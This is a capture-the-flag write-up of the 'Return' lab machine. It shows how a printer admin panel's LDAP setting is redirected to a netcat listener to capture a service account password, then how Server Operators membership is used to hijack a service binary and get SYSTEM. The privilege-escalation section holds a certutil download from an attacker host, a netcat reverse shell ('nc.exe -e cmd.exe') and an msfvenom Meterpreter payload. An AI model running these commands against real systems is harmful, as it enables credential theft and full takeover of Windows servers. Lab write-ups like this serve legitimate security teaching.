# Return (Easy)

A web-based network printer admin panel leaks a service account's password over LDAP, followed by two alternative service-binary hijack routes to SYSTEM.

## Enumeration

```bash
nmap -sC -sV <target>
```

```
53/tcp  open domain
80/tcp  open http          Microsoft IIS 10.0 — "HTB Printer Admin Panel"
88/tcp  open kerberos-sec
135/tcp open msrpc
139/tcp open netbios-ssn
389/tcp open ldap          (Domain: return.local)
445/tcp open microsoft-ds
464/tcp open kpasswd5
593/tcp open ncacn_http
636/tcp open tcpwrapped
```

## Foothold — Printer panel LDAP credential capture

The web panel's LDAP "server address" setting can be redirected to an attacker-controlled listener while saving:

1. Start a listener on the LDAP port the panel uses:
   ```bash
   nc -lvnp 389
   ```
2. In the panel, change the LDAP server address from `printer.return.local` to the attacker's IP, then save.
3. The panel immediately attempts an LDAP bind to the attacker's listener, leaking the configured service account's plaintext password.

Password recovered is redacted (`<REDACTED>`).

```bash
evil-winrm -i <target> -u svc-printer -p '<REDACTED>'
```
→ `user.txt` retrieved.

## Privilege Escalation — Server Operators group

```bash
net user svc-printer
```

The account belongs to **Server Operators**, which can reconfigure services. A vulnerable service (`VMTools`) was identified via:

```powershell
services
```

### Method 1 — netcat reverse shell via service binary

```bash
# attacker
python3 -m http.server 4444
# victim
certutil -urlcache -f http://<attacker>:4444/nc.exe nc.exe
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <attacker> 1234"
# attacker
nc -lvnp 1234
# victim
sc.exe stop VMTools
sc.exe start VMTools
```

### Method 2 — Meterpreter via msfvenom payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=7777 -f exe > wshell.exe
```

Upload, point the service binary at it, and catch it with `multi/handler`, then migrate into a `NT AUTHORITY\SYSTEM` process.

```bash
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\wshell.exe"
sc.exe stop VMTools
sc.exe start VMTools
```

## Takeaways

- Any configuration panel that re-authenticates to a user-supplied host is a credential-capture vector.
- Group membership (Server Operators) that allows reconfiguring services is equivalent to SYSTEM-level code execution.
